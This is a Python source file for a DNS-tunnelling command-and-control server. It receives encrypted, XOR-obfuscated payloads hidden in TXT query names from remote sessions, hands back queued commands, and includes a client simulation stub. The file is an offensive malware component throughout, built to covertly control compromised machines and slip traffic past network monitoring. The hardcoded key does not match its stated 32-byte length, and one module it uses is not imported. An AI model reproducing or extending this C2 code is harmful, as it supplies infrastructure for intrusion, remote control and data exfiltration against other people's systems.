import base64
import logging
import threading
import socketserver
import dns.resolver
import dns.message
import dns.name
import dns.rcode
import dns.rdatatype
import dns.query
import queue
import time
from typing import Dict, Optional

from core.logger import get_logger
from core.crypto import aes_decrypt, aes_encrypt
from core.protocols.session_manager import SessionManager
from core.obfuscation import xor_obfuscate, xor_deobfuscate

logger = get_logger("DNS-C2")

SESSION_STORE: Dict[str, "DNSSession"] = {}
SESSION_MANAGER = SessionManager()
SHARED_SECRET_KEY = b'my_shared_key_32bytes_____!!!'  # MUST BE 32 bytes

COMMAND_QUEUE = queue.Queue()

class DNSSession:
    def __init__(self, session_id: str, client_ip: str):
        self.session_id = session_id
        self.client_ip = client_ip
        self.last_seen = time.time()
        self.buffer = b""

    def refresh(self):
        self.last_seen = time.time()

class DNSServerHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            data, socket_ = self.request
            request = dns.message.from_wire(data)
            response = dns.message.make_response(request)
            query_name = request.question[0].name.to_text().rstrip('.')
            query_type = request.question[0].rdtype
            client_ip = self.client_address[0]

            if query_type == dns.rdatatype.TXT:
                session_id, encoded_payload = self._parse_query(query_name)
                decrypted_payload = self._decode_payload(encoded_payload)
                logger.debug(f"Received from {session_id}: {decrypted_payload}")
                SESSION_MANAGER.update_session(session_id, client_ip)

                response_data = self._get_next_command(session_id)
                encoded_response = self._encode_payload(response_data)
                response.answer.append(dns.rrset.from_text(
                    request.question[0].name, 60, 'IN', 'TXT', f'"{encoded_response}"'
                ))
            else:
                response.set_rcode(dns.rcode.FORMERR)

            socket_.sendto(response.to_wire(), self.client_address)
        except Exception as e:
            logger.exception(f"DNS handler error: {e}")

    def _parse_query(self, fqdn: str) -> (str, str):
        parts = fqdn.split('.')
        session_id = parts[0]
        encoded_payload = ''.join(parts[1:-2])
        return session_id, encoded_payload

    def _decode_payload(self, payload: str) -> str:
        raw = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
        decrypted = aes_decrypt(raw, SHARED_SECRET_KEY)
        return xor_deobfuscate(decrypted.decode())

    def _encode_payload(self, message: str) -> str:
        encrypted = aes_encrypt(xor_obfuscate(message).encode(), SHARED_SECRET_KEY)
        return base64.urlsafe_b64encode(encrypted).decode().strip('=')

    def _get_next_command(self, session_id: str) -> str:
        if not SESSION_MANAGER.has_command(session_id):
            return "ping"
        return SESSION_MANAGER.pop_command(session_id)

class DNSServer:
    def __init__(self, bind_ip: str = '0.0.0.0', port: int = 53):
        self.bind_ip = bind_ip
        self.port = port
        self.server = socketserver.UDPServer((bind_ip, port), DNSServerHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)

    def start(self):
        logger.info(f"[DNS-C2] Listening on {self.bind_ip}:{self.port} (UDP)")
        self.thread.start()

    def stop(self):
        logger.info("[DNS-C2] Shutting down")
        self.server.shutdown()
        self.server.server_close()

# Client Simulation Stub (can be removed for production use)
def simulate_client_query(session_id: str, command: str, dns_server_ip: str):
    encoded = base64.urlsafe_b64encode(aes_encrypt(xor_obfuscate(command).encode(), SHARED_SECRET_KEY)).decode().strip('=')
    fqdn = f"{session_id}.{encoded}.example.com"
    query = dns.message.make_query(fqdn, dns.rdatatype.TXT)
    response = dns.query.udp(query, dns_server_ip)
    for answer in response.answer:
        print(f"Response TXT: {answer.to_text()}")

if __name__ == "__main__":
    dns_server = DNSServer()
    dns_server.start()
